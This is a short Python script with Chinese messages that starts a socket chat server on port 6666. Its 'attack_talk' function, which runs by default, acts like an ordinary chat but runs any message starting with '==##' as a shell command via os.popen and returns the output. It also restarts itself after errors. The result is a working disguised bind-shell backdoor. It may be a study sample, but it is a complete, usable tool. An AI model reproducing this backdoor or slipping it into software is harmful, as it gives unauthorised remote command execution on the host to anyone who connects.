import socket,os


def normal_talk():
    s = socket.socket()
    s.bind(('0.0.0.0',6666))
    s.listen()
    print("监听中...")
    ch,cl = s.accept()
    while True:
        receive = ch.recv(1024).decode()
        print(f"接收消息:{receive}")
        reply = "返回消息"
        ch.send(reply.encode())

def attack_talk():
    try:
        s = socket.socket()
        s.bind(('0.0.0.0',6666))
        s.listen()
        print("监听中...")
        ch,cl = s.accept()
        while True:
            receive = ch.recv(1024).decode()
            print("接收到:",receive)
            if receive.startswith("==##"):
                command = receive.split(',')[-1]
                reply = os.popen(command).read()
                ch.send(f"执行命令: {command},得到结果:\n{reply}".encode())
            else:
                print(f"接收消息:{receive}")
                reply = "返回消息"
                ch.send(reply.encode())
    except:
        print("发生异常")
        s.close()
        attack_talk()


if __name__ == '__main__':
    attack_talk()